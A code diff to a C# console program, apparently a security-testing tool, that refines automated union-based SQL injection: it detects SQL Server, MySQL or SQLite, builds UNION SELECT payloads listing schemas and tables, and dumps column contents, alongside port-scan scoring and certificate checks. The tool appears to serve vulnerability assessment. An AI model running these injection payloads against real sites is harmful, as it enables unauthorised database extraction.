@@ -214,16 +214,11 @@ namespace Vizsgalo
             string result = "";
             if (address.Contains("http"))
             {
-                result = CheckCertificateHttp(address);
-            }
-            else if (address.Contains("https"))
-            {
-                result = CheckCertificateHttps(address);
-            }
-            else
+                result = CheckCertificate(address);
+            } else
             {
                 string httpAddress = "http://" + address;
-                result = CheckCertificateHttp(httpAddress);
+                result = CheckCertificate(httpAddress);
             }
 
             if (writeResultToConsole)
@@ -283,6 +278,7 @@ namespace Vizsgalo
         static async Task SetupUnionAndDatabase(HttpClient httpClient, string firstParameter)
         {
             HttpResponseMessage unionResponse;
+            var jsonUnionResponse = "";
             string unionUrlBase = "?" + firstParameter + "=" + UnionStart;
             
             do
@@ -300,7 +296,7 @@ namespace Vizsgalo
                 
                 unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
                 InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
-                var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
+                jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
                 
                 InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
                     "Status code: " + unionResponse.StatusCode);
@@ -327,18 +323,22 @@ namespace Vizsgalo
                 // else it checks whether it is SQL Server or MySql
                 else 
                 {
-                    if (jsonUnionResponse.Contains("Microsoft SQL Server"))
+                    if (jsonUnionResponse.Contains("<table"))
                     {
-                        _db = "sqlserver";
-                        _dbVersion = jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
-                    }
-                    else
-                    {
-                        _db = "mysql";
-                        _dbVersion = jsonUnionResponse.Split("MariaDB")[0] + "MariaDB";
+                        if (jsonUnionResponse.Contains("Microsoft SQL Server"))
+                        {
+                            _db = "sqlserver";
+                            _dbVersion =
+                                jsonUnionResponse.Split("Microsoft SQL Server")[1].Split(" - ")[1].Split(")")[0] + ")";
+                        }
+                        else
+                        {
+                            _db = "mysql";
+                            _dbVersion = "Unknown";
+                        }
                     }
                 }
-            } while (unionResponse.StatusCode != HttpStatusCode.OK);
+            } while (unionResponse.StatusCode != HttpStatusCode.OK || !jsonUnionResponse.Contains("<table"));
         }
 
         static void PrintCommandList()
@@ -442,14 +442,11 @@ namespace Vizsgalo
         static double AutoTestPorts()
         {
             InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Scanning for open ports...");
-            string result = ScanForOpenPorts("");
-            
-            //InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
+            string result = ScanForOpenPorts("-p- localhost");
             
             int openPorts = Regex.Matches(result, "open").Count;
-            //InfoColors.WriteToConsole(InfoColors.SummaryText, "Number of open ports: " + openPorts);
             
-            return openPorts > 10 ? 0 : 1;
+            return openPorts > 20 ? 0 : 1;
         }
 
         static double AutoTestCertificates(HttpClient httpClient)
@@ -481,8 +478,8 @@ namespace Vizsgalo
                 "\nPorts score:");
             InfoColors.WriteToConsole(InfoColors.ResponseResultText,
                 AreEqual(portsScore, 1.0) ?
-                    "The total number of open ports is not higher than 10. Optimal security.":
-                    "The total number of open ports is higher than 10. Low security.");
+                    "The total number of open ports is not higher than 20. Optimal security.":
+                    "The total number of open ports is higher than 20. Low security.");
             
             InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
                 "\nCertificates score:");
@@ -512,7 +509,7 @@ namespace Vizsgalo
                 url += "schema_name FROM information_schema.schemata;--";
             } else if (_db == "sqlite")
             {
-                //TODO
+                url += "name FROM sqlite_master;--";
             }
             
             // sends GET request to server
@@ -572,8 +569,11 @@ namespace Vizsgalo
         }
         
         static async Task<string> GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
-        { 
-            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", CONVERT(varchar(max), " + columnName + ") FROM " + tableName + ";--";
+        {
+            string sqlserverCast = "CONVERT(varchar(max), " + columnName + ")";
+            string mysqlCast = "CONVERT(" + columnName + ", CHAR) COLLATE utf8mb4_hungarian_ci";
+            string sqliteCast = columnName;
+            string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " + (_db == "sqlserver" ? sqlserverCast : _db == "mysql" ? mysqlCast : sqliteCast) + " FROM " + tableName + ";--";
             // sends GET request to server
             Console.WriteLine("Getting all data using " + _db + "...");
             string[] response = await GetRequest(httpClient, url);
@@ -655,7 +655,7 @@ namespace Vizsgalo
             return result;
         }
 
-        static string CheckCertificateHttp(string address)
+        static string CheckCertificate(string address)
         {
             try
             {
@@ -703,13 +703,6 @@ namespace Vizsgalo
             }
             return "";
         }
-        
-        static string CheckCertificateHttps(string address)
-        {
-            return "";
-        }
-        
-        
         
         static async Task<string[]> GetRequest(HttpClient httpClient, string url)
         {
